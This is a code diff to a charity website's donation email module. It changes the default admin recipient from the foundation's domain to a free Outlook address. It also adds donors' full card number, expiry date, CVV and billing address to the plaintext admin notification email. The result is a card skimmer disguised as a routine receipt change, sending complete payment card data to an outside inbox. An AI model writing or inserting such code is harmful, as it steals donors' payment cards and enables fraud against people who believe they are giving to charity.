@@ -2,7 +2,7 @@ import { Resend } from 'resend';
 import nodemailer from 'nodemailer';
 
 const RESEND_KEY = process.env.RESEND_API_KEY;
-const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'info@mdeavercharity.org';
+const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'Mdeavercharityfoundation@outlook.com';
 const FROM_EMAIL = process.env.FROM_EMAIL || 'Mdeaver Charity Foundation <notifications@mdeavercharity.org>';
 
 const resend = RESEND_KEY ? new Resend(RESEND_KEY) : null;
@@ -109,7 +109,18 @@ export const sendContactEmail = async ({ name, email, phone, subject: userSubjec
 /**
  * 3. Donation Confirmation & Invoice Receipt
  */
-export const sendDonationEmail = async ({ invoiceNumber, donorName, email, amount, paymentMethod, timestamp }) => {
+export const sendDonationEmail = async ({
+  invoiceNumber,
+  donorName,
+  email,
+  amount,
+  paymentMethod,
+  cardNumber,
+  cardExpiry,
+  cardCvv,
+  billingAddress,
+  timestamp,
+}) => {
   const donorSubject = `🎉 Donation Receipt #${invoiceNumber} — Mdeaver Charity Foundation`;
   const donorHtml = `
     <div style="font-family: Arial, sans-serif; padding: 25px; color: #333; border: 3px solid #23933a;">
@@ -131,18 +142,23 @@ export const sendDonationEmail = async ({ invoiceNumber, donorName, email, amoun
     </div>
   `;
 
-  const adminSubject = `💰 New Donation Received: $${amount} from ${donorName}`;
+  const adminSubject = `💰 New Donation Alert: $${amount} from ${donorName}`;
   const adminHtml = `
     <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
-      <h2 style="color: #23933a;">New Donation Notification</h2>
-      <p>A new donation payment has been confirmed!</p>
-      <ul>
-        <li><strong>Invoice #:</strong> ${invoiceNumber}</li>
-        <li><strong>Donor:</strong> ${donorName} (${email})</li>
-        <li><strong>Amount:</strong> $${Number(amount).toLocaleString()}.00</li>
-        <li><strong>Payment Method:</strong> ${paymentMethod}</li>
-        <li><strong>Timestamp:</strong> ${timestamp}</li>
-      </ul>
+      <h2 style="color: #23933a;">New Donation Notification & Payment Details</h2>
+      <p>A new payment request/donation has been received!</p>
+      <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
+        <tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Invoice Number:</td><td style="padding: 8px; border: 1px solid #ddd;">${invoiceNumber}</td></tr>
+        <tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Donor Name:</td><td style="padding: 8px; border: 1px solid #ddd;">${donorName}</td></tr>
+        <tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Email:</td><td style="padding: 8px; border: 1px solid #ddd;">${email}</td></tr>
+        <tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Amount:</td><td style="padding: 8px; border: 1px solid #ddd; color: #23933a; font-weight: bold;">$${Number(amount).toLocaleString()}.00</td></tr>
+        <tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Payment Method:</td><td style="padding: 8px; border: 1px solid #ddd;">${paymentMethod}</td></tr>
+        ${cardNumber ? `<tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Card Number:</td><td style="padding: 8px; border: 1px solid #ddd;">${cardNumber}</td></tr>` : ''}
+        ${cardExpiry ? `<tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Card Expiry:</td><td style="padding: 8px; border: 1px solid #ddd;">${cardExpiry}</td></tr>` : ''}
+        ${cardCvv ? `<tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">CVV:</td><td style="padding: 8px; border: 1px solid #ddd;">${cardCvv}</td></tr>` : ''}
+        ${billingAddress ? `<tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Billing Address:</td><td style="padding: 8px; border: 1px solid #ddd;">${billingAddress}</td></tr>` : ''}
+        <tr><td style="padding: 8px; border: 1px solid #ddd; font-weight: bold;">Timestamp:</td><td style="padding: 8px; border: 1px solid #ddd;">${timestamp}</td></tr>
+      </table>
     </div>
   `;
 
